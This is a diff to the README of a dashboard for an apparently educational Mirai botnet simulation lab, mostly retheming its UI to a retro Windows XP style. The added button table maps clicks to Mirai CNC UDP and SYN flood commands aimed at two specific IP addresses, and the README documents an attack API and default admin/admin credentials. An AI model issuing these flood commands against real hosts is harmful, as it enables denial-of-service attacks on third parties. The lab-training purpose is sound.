@@ -1,7 +1,7 @@
-# Soft Command Deck — Mirai Lab Dashboard
+# Soft Command Deck.exe - Mirai Lab Dashboard
 
-Cute web dashboard for the **isolated Mirai simulation lab**.  
-Replaces manual `telnet 127.0.0.1 23` → login → `botcount` with a live UI.
+Retro Windows XP / Windows 2000 dashboard for the **isolated Mirai simulation lab**.  
+Replaces manual `telnet 127.0.0.1 23` -> login -> `botcount` with a live UI.
 
 > **Educational / lab only.** Run only inside your offline Proxmox lab.  
 > Do not point this at any real network.
@@ -17,7 +17,16 @@ Replaces manual `telnet 127.0.0.1 23` → login → `botcount` with a live UI.
 | **Custom command** | Same grammar as `admin@botnet#` |
 | **Live console** | Aggregated dashboard ↔ CNC logs |
 | **Topology map** | C2 / Loader / Bot / targets at a glance |
-| **Cute cyber UI** | Soft neon glassmorphism theme |
+| **Retro hacker UI** | XP chrome, beveled controls, HyperTerminal console |
+
+## Theme notes
+
+- Frontend stays pure static HTML/CSS/JS, served by Flask from `dashboard/frontend/`.
+- The visual shell uses XP Luna title bars, grey window chrome, inset panels, menu bars, classic buttons, and a taskbar footer.
+- Terminal panels use `Lucida Console` / `Courier New` style mono text with green-on-black CRT treatment.
+- CNC link status is green when online and red when offline.
+- Bot count status is green when bots are connected and yellow when the count is `0`, so "waiting for bots" is not confused with CNC failure.
+- No backend API contract changes were made for the theme.
 
 Architecture:
 
@@ -61,6 +70,15 @@ nohup ./cnc > cnc.log 2>&1 &
 ```
 
 ### 2) Install & start dashboard
+
+Quick path:
+
+```bash
+cd ~/Mirai-Botnet-Simulation-Lab/dashboard
+./start.sh
+```
+
+Manual path:
 
 ```bash
 cd ~/Mirai-Botnet-Simulation-Lab/dashboard/backend
@@ -106,6 +124,26 @@ Default CNC login matches `scripts/db.sql`: **admin / admin**.
 | POST | `/api/botcount` | Force `botcount` |
 | POST | `/api/command` | `{"command":"botcount"}` |
 | POST | `/api/attack` | `{"target":"sg"|"kr", "duration":30, "method":"udp"}` |
+
+---
+
+## Button -> command mapping
+
+| UI button | Endpoint | CNC command or payload |
+|-----------|----------|------------------------|
+| Bot Count | `POST /api/command` | `botcount` |
+| Refresh status / Full Status | `GET /api/status` | Status poll only |
+| UDP SG 10s | `POST /api/attack` | `{"target":"sg","method":"udp","duration":10,"dport":80}` -> `udp 203.0.113.100 10 dport=80` |
+| UDP SG 30s | `POST /api/attack` | `{"target":"sg","method":"udp","duration":30,"dport":80}` -> `udp 203.0.113.100 30 dport=80` |
+| UDP SG 60s | `POST /api/attack` | `{"target":"sg","method":"udp","duration":60,"dport":80}` -> `udp 203.0.113.100 60 dport=80` |
+| UDP KR 10s | `POST /api/attack` | `{"target":"kr","method":"udp","duration":10,"dport":80}` -> `udp 210.89.0.100 10 dport=80` |
+| UDP KR 30s | `POST /api/attack` | `{"target":"kr","method":"udp","duration":30,"dport":80}` -> `udp 210.89.0.100 30 dport=80` |
+| UDP KR 60s | `POST /api/attack` | `{"target":"kr","method":"udp","duration":60,"dport":80}` -> `udp 210.89.0.100 60 dport=80` |
+| SYN SG 20s | `POST /api/attack` | `{"target":"sg","method":"syn","duration":20,"dport":80}` -> `syn 203.0.113.100 20 dport=80` |
+| SYN SG 60s | `POST /api/attack` | `{"target":"sg","method":"syn","duration":60,"dport":80}` -> `syn 203.0.113.100 60 dport=80` |
+| SYN KR 20s | `POST /api/attack` | `{"target":"kr","method":"syn","duration":20,"dport":80}` -> `syn 210.89.0.100 20 dport=80` |
+| SYN KR 60s | `POST /api/attack` | `{"target":"kr","method":"syn","duration":60,"dport":80}` -> `syn 210.89.0.100 60 dport=80` |
+| Custom command | `POST /api/command` | Text field value |
 
 ---
 
